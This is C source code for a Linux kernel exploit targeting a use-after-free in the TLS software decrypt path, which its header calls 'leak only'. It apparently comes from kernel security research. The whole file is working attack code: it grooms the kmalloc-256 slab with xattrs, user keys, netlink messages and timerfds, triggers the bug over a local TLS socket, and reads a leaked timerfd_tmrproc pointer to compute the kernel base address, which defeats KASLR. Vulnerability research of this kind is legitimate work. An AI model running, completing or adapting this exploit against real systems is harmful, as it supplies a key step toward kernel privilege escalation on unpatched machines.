// net/tls: tls decrypt partial read use-after-free - leak only

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <assert.h>
#include <sys/inotify.h>
#include <linux/xfrm.h>
#include <linux/pfkeyv2.h>

#include <linux/pkt_cls.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <keyutils.h>
#include <sys/xattr.h>
#include <err.h>
#include <sys/timerfd.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <pthread.h>
#include <linux/if_packet.h>
#include <netinet/tcp.h>
#include <linux/tls.h>
#include <linux/if_alg.h>
#include <math.h>
#include <linux/filter.h>

//#include "kernelver_lts.h"
#include "kernelver_6.1.76.h"

static char *g_mmapped_buf;
static uint64_t g_kernel_text;
static int g_debug;

#ifdef DEBUG
#define err(errcode, msg, ...) \
        do { \
                perror(msg); \
                sleep(1000); \
        } while (0)
#define errx(errcode, msg, ...) \
        do { \
                puts(msg); \
                sleep(1000); \
        } while (0)
#endif



void enable_dynamic_debug(char *spec)
{
        static FILE *f = NULL;

#ifndef DEBUG
        return;
#endif
        
        if (!f) {
                f = fopen("/sys/kernel/debug/dynamic_debug/control", "w");
        
                if (!f) {
                        printf("Unable to open dynamic debug control\n");
                        return;
                }
        }

        rewind(f);
        fwrite(spec, strlen(spec), 1, f);
        fflush(f);
}

void set_cpu(int cpu)
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        CPU_SET(cpu, &cpus);     
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}

void set_cpu_all()
{
        cpu_set_t cpus;
        CPU_ZERO(&cpus);      
        for (int i = 0; i < 4; i++)
        {
                CPU_SET(i, &cpus);     
        }
        if (sched_setaffinity(0, sizeof(cpu_set_t), &cpus) < 0) {
                perror("setaffinity");
                exit(1);
        }
}


#define MMAP_SIZE 0x10000

int alloc_xattr_fd_attr(int fd, char *attr, size_t size, void *buf)
{
        int res = fsetxattr(fd, attr, buf, size - 32, XATTR_CREATE);
        if (res < 0) {
               printf("attr: %s\n", attr);
                err(1, "fsetxattr");
        }

        return fd;
}

int alloc_xattr_fd(int fd, unsigned int id, size_t size, void *buf)
{
        char *attr;

        asprintf(&attr, "security.%d", id);
        alloc_xattr_fd_attr(fd, attr, size, buf);

        return fd;
}

int alloc_xattr_fd2(int fd, unsigned int id, size_t size, void *buf)
{
        char attr_buf[1024];
        strcpy(attr_buf, "security.");
        memset(attr_buf+9, 'a', 200);
        
        sprintf(attr_buf+9+200, "security.%d", id);
        alloc_xattr_fd_attr(fd, attr_buf, size, buf);

        return fd;
}

void free_xattr_fd(int fd, int id)
{
        char *attr;

        asprintf(&attr, "security.%d", id);

        fremovexattr(fd, attr);
}


ssize_t read_xattr_fd(int fd, int id, char *buf, size_t sz)
{
        char *attr;

        asprintf(&attr, "security.%d", id);

        ssize_t ret = fgetxattr(fd, attr, buf, sz);

        if (ret < 0)
                err(1, "read_xattr_fd");

        return ret;
}

int alloc_xattr(unsigned int id, size_t size, void *buf)
{
        int fd;
        char *fname;

        asprintf(&fname, "/tmp/xattr%d", id);
        fd = open(fname, O_RDWR|O_CREAT);
        if (fd < 0)
                err(1, "open xattr");
        
        alloc_xattr_fd_attr(fd, "security.attr", size, buf);

        return fd;
}



#define SLAB_256_CNT 16
#define KEY_CNT SLAB_256_CNT*6
#define KEY2_CNT 100
#define A1_CNT SLAB_256_CNT*10
#define TFD_CNT SLAB_256_CNT*3
#define TFD2_CNT SLAB_256_CNT

enum XATTR_IDX_RANGE {
        A1,
        A2,
        XATTR_IDX_MAX
};

#define XATTR_MAX_CHUNK 3000
#define XATTR_IDX(base, offset) (base*XATTR_MAX_CHUNK + offset)




void setup_tls(int sock, int is_rx)
{
        if (setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")) < 0)
                err(1, "setsockopt");
        
        static struct tls12_crypto_info_aes_ccm_128 crypto_info = {.info.version = TLS_1_2_VERSION, .info.cipher_type = TLS_CIPHER_AES_CCM_128};

        if (setsockopt(sock, SOL_TLS, is_rx ? TLS_RX : TLS_TX, &crypto_info, sizeof(crypto_info)) < 0)
                err(1, "TLS_TX");
}

int sender(void *a)
{
        int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        struct sockaddr_in addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(3333);

        if (connect(sock, &addr, sizeof(addr)) < 0)
                err(1, "connect");


        setup_tls(sock, 0);

        char buf[1024];
        memset(buf, 'B', sizeof(buf));
        int ret = send(sock, g_mmapped_buf, 100, 0);
}

key_serial_t alloc_keyring(int id)
{
        key_serial_t serial;
        char desc[512];

 //       memset(desc, ' ', 256);

        snprintf(desc, sizeof(desc), "%d", id);

        serial = syscall(SYS_add_key, "keyring", desc, NULL, 0, KEY_SPEC_PROCESS_KEYRING);

        if (serial < 0) {
                err(1, "keyring add");
        }

        return serial;
}

key_serial_t alloc_key(int id, size_t len, char *buf)
{
        key_serial_t serial;
        char desc[256];
        len -= 24;

        snprintf(desc, sizeof(desc), "%d", id);

        serial = syscall(SYS_add_key, "user", desc, buf, len, KEY_SPEC_PROCESS_KEYRING);

        if (serial < 0) {
                err(1, "key add");
        }

        return serial;
}

void free_key(key_serial_t key)
{
        long ret = syscall(SYS_keyctl, KEYCTL_UNLINK, key, KEY_SPEC_PROCESS_KEYRING);
        if (ret < 0) {
                perror("key unlink");
                exit(1);
        }

}

void prepare_keyjar()
{
        key_serial_t keys2[KEY2_CNT];

        for (unsigned int i = 0; i < KEY2_CNT; i++)
        {
                keys2[i] = alloc_key(1000 + i, 32, g_mmapped_buf);
        }

        free_key(keys2[0]);
/*
        for (unsigned int i = 0; i < KEY2_CNT; i++)
        {
                if ((i % 2) == 0)
                        free_key(keys2[i]);
        }
*/
}




unsigned int parse_zoneinfo(char *buf, unsigned int *high, unsigned int *batch)
{
        char *t;

        t = strstr(buf, "zone   Normal");
        t = strstr(t, "cpu: 0");
        t = strstr(t, "count: ");

//        puts(t);
                
        unsigned int cnt = atoi(t+7);

        if (high) {
                t = strstr(t, "high: ");
                *high = atoi(t+6);
        }

        if (batch) {
                t = strstr(t, "batch: ");
                *batch = atoi(t+7);
        }

        return cnt;
        
}

unsigned int get_pagecount(unsigned int *high, unsigned int *batch)
{
        static char zibuf[10000];
        static int fdzi = -1;

        if (fdzi < 0) {
                fdzi = open("/proc/zoneinfo", 0, O_DIRECT);
                if (fdzi < 0)
                        err(1, "open zoneinfo");
        }

        lseek(fdzi, SEEK_SET, 0);
        read(fdzi, zibuf, sizeof(zibuf));               

        return parse_zoneinfo(zibuf, high, batch);
}

void die(char *msg)
{
        if (msg)
        puts(msg);

        unlink("/tmp/xl");


        exit(1);
}

void free_netlink(int sock)
{
        recv(sock, g_mmapped_buf, MMAP_SIZE, 0);
        close(sock);
}

int prepare_netlink(unsigned int port_id, int *listen_sock)
{
        int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock == -1) {
                err(1, "socket netlink\n");
        }
        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id;
        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)))
                err(1, "bind netlink fail\n");

        int sock_client = socket(AF_NETLINK, SOCK_RAW, NETLINK_USERSOCK);
        if (sock_client == -1) {
                err(1, "socket netlink\n");
        }

        *listen_sock = sock;
        return sock_client;
}


void alloc_netlink(int sock, size_t len, char *buf)
{
        static unsigned int port_id = 0x1111;

        if (len <= 0x140)
                err(1, "alloc_netlink: len too small\n");

        struct sockaddr_nl addr;
        memset(&addr, 0, sizeof(addr));
        addr.nl_family = AF_NETLINK;
        addr.nl_pid = port_id++;

        ssize_t n = sendto(sock, buf, len - 0x140, MSG_DONTWAIT, (struct sockaddr*)&addr, sizeof(addr));

        if (n < 0)
                err(1, "sendto netlink\n");

}


int main(int argc, char **argv)
{
        int ret;
        char hostname[128];

        gethostname(hostname, sizeof(hostname));

        if (!strncmp(hostname, "kfun", 8)) {
                printf("Not on the host, you idiot!\n");
                return 1;
        }

        if (argc > 1 && !strcmp(argv[1], "debug")) {
                g_debug = 1;
        }

        setbuf(stdout, NULL);

        g_mmapped_buf = mmap(NULL, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_POPULATE, -1, 0);
        if (g_mmapped_buf == MAP_FAILED) {
                perror("mmap");
                return 1;
        }

        memset(g_mmapped_buf, 0, MMAP_SIZE);


        struct timeval time;
        gettimeofday(&time,NULL);

        srand((time.tv_sec * 1000) + (time.tv_usec / 1000));


        if (g_debug) {
                enable_dynamic_debug("file timerfd.c +p");
                enable_dynamic_debug("file tls_sw.c +p");
                enable_dynamic_debug("file user_defined.c +p");
                enable_dynamic_debug("file keyctl.c +p");
                enable_dynamic_debug("file af_netlink.c +p");
                enable_dynamic_debug("file slub.c +p");
                enable_dynamic_debug("file slab_common.c +p");
        }


        set_cpu(0);


        int sock_netlink_server;
        int sock_netlink = prepare_netlink(0x1111, &sock_netlink_server);


        int xattr_fd = open("/tmp/xl", O_RDWR|O_CREAT);
        if (xattr_fd < 0)
                err(1, "xattr open\n");

        struct sockaddr_alg sa = {
                .salg_family = AF_ALG,
                .salg_type = "skcipher",
                .salg_name = "cryptd(ctr(aes-generic))"
        };
        int c1 = socket(AF_ALG, SOCK_SEQPACKET, 0);

        if (bind(c1, (struct sockaddr *)&sa, sizeof(sa)) < 0)
                err(1, "af_alg bind");



        struct sockaddr_alg sa2 = {
                .salg_family = AF_ALG,
                .salg_type = "aead",
                .salg_name = "ccm_base(cryptd(ctr(aes-generic)),cbcmac(aes-aesni))"
        };

        if (bind(c1, (struct sockaddr *)&sa2, sizeof(sa)) < 0)
                err(1, "af_alg bind");

        int sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        if (sock_serv < 0)
                err(1, "socket");

        int flag = 1;
        setsockopt(sock_serv, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

        struct sockaddr_in addr, peer_addr;
        memset(&addr, 0, sizeof(addr));

        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("127.0.0.1");
        addr.sin_port = htons(3333);

        if (bind(sock_serv, &addr, sizeof(addr)) < 0)
                err(1, "connect");

        listen(sock_serv, 99999);

        sender(NULL);

        socklen_t sz;
        int sock = accept(sock_serv, &peer_addr, &sz);

        if (sock < 0)
                err(1, "accept");

        setup_tls(sock, 1);


        enable_dynamic_debug("file page_alloc.c:3783 +p");
        enable_dynamic_debug("file page_alloc.c:3475 +p");


//        prepare_keyjar();

//        sleep(1);

        int pcnt1 = get_pagecount(NULL, NULL);
        unsigned int detected = 0;

        for (int i = 0; i < A1_CNT; i++)
        {
                alloc_xattr_fd(xattr_fd, XATTR_IDX(A1, i), 197, g_mmapped_buf);
                int pcnt2 = get_pagecount(NULL, NULL);

                if (i > 0 && (pcnt1-pcnt2) == 1) {
                        detected = 1;
                        break;
                }

                pcnt1 = pcnt2;
                        
        }

        if (!detected)
                die("Unable to detect new kmalloc-256 slab");

        memset(g_mmapped_buf, 'A', 256);


        for (int i = 0; i < SLAB_256_CNT-1; i++)
        {
                alloc_xattr_fd(xattr_fd, XATTR_IDX(A2, i), 197, g_mmapped_buf);
                        
        }

        ret = recv(sock, g_mmapped_buf, 80, 0);
//        printf("recv ret: %d\n", ret);
        key_serial_t keys[KEY_CNT];

        memset(g_mmapped_buf, 'K', 256);

        for (int i = 0; i < KEY_CNT; i++)
        {
                keys[i] = alloc_key(i, 197, g_mmapped_buf);
        }

        ret = recv(sock, g_mmapped_buf, 20, 0);

        memset(g_mmapped_buf, 0xff, 0x2000);
        alloc_netlink(sock_netlink, 0x2000, g_mmapped_buf);
        
        free_netlink(sock_netlink_server);


        
        memset(g_mmapped_buf, 0, 0x100);


        int tfds[TFD_CNT];
        int tfds2[TFD2_CNT];


        pcnt1 = get_pagecount(NULL, NULL);
        for (int i = 0; i < TFD_CNT; i++)
        {
                tfds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
                int pcnt2 = get_pagecount(NULL, NULL);

                if ((pcnt1-pcnt2) == 1) {
                        detected = 1;
                        break;
                }

                pcnt1 = pcnt2;
        }

        struct itimerspec its = { 0 };

        its.it_value.tv_sec = 999999;

        for (int i = 0; i < TFD2_CNT; i++)
        {
                tfds2[i] = timerfd_create(CLOCK_MONOTONIC, 0);
                timerfd_settime(tfds2[i], 0, &its, NULL);
        }

        uint64_t found = 0;
        for (int i = 0; i < KEY_CNT; i++)
        {
                memset(g_mmapped_buf, 0, MMAP_SIZE);
                size_t sz = keyctl_read(keys[i], g_mmapped_buf, MMAP_SIZE);
//                printf("Got read: %d idx: %d \n", sz, i);
                if (sz > 0) {
                        for (int j = 0; j < MMAP_SIZE; j += 8)
                        {
                                uint64_t *p = (uint64_t *) (g_mmapped_buf + j);
                                if (*p == 0xffffffffffffffffL)
                                        continue;
                                if (*p && ((*p) & 0xffffffff00000000uL) == 0xffffffff00000000uL && ((*p) & 0xfff) == (TIMERFD_TMRPROC & 0xfff)) {
//                                if (*p && ((*p) & 0xffffffff00000000uL) == 0xffffffff00000000uL) {
//                                        printf("%d %d => 0x%lx\n", i, j, *p);
                                        found = *p - (TIMERFD_TMRPROC - 0xffffffff81000000L);
                                        break;
                                } 
                        }
                                
                }

                if (found)
                        break;
        }
        
        if (found) {
                printf("Leak:0x%lx\n", found);
                sleep(1000);
        }
        die("Failed");

// Can't exit, everything might crash
        while (1) 
                sleep(1000);

        return 0;
}
